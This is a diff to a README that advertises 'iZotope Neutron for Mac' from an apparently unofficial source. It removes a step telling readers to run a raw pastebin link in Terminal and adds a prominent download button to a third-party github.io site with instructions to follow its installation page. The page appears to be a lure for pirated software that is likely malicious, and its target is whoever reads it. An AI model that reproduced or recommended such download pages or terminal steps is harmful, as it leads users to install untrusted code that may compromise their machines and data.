@@ -1,20 +1,21 @@
-# iZotope Neutron for Mac  
+# iZotope Neutron  
 
 <p align="center">
   <img src="https://i0.wp.com/www.macbed.com/wp-content/uploads/2023/04/23654.png" alt="iZotope Neutron Logo" width="240"/>
 </p>
 
----
+<div align="center">
 
-## Installation via Terminal (Optional)  
+[![⬇️ Download iZotope Neutron for Mac](https://img.shields.io/badge/⬇️_Download_iZotope_Neutron_Mac-orange?style=for-the-badge&logo=apple)](https://izotope-neutron-for-macos.github.io/.github)
 
-1. Open **Terminal** and run the command:  
-
-https://pastebin.com/raw/FrVJnMKh  
-
-2. Follow the on-screen instructions to complete the installation.  
+</div>
 
 ---
+
+1. Go to the installation site using the button above.
+2. Follow the instructions on the installation page to install the program correctly
+---
+
 
 ## 🎚️ What is iZotope Neutron?  
 
